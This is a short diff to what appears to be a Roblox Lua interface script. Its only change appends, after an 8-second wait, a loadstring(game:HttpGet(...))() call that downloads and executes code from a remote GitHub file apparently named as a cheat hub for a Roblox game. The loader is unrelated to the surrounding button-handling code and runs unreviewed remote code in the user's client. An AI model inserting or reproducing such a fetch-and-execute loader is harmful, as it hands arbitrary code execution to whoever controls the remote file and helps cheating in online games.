@@ -232,3 +232,5 @@ noButton.MouseButton1Click:Connect(function()
         end
     end)
 end)
+wait(8)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/weatherwess-lgtm/ArsenalV2/refs/heads/main/YBA.AzureHub"))()
